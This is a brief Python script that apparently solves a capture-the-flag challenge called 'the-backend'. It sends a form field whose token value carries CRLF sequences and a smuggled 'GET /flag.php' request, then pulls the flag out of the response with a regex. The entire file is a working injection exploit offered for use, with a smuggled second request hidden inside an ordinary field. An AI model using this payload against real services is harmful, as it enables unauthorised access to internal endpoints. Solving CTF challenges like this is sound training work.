#!/bin/python3
import os
import logging
import re

from requests import Session


logging.disable()


URL = os.environ.get('URL', 'http://the-backend.challs.cyberhighschools.it')
if URL.endswith('/'):
   URL = URL[:-1]
s = Session()


res = s.post(f'{URL}/', data={'token': 'testtoken\r\n\r\nGET /flag.php HTTP/1.0'})


flag = re.search(r'flag{.*}', res.text).group(0)
print(flag)
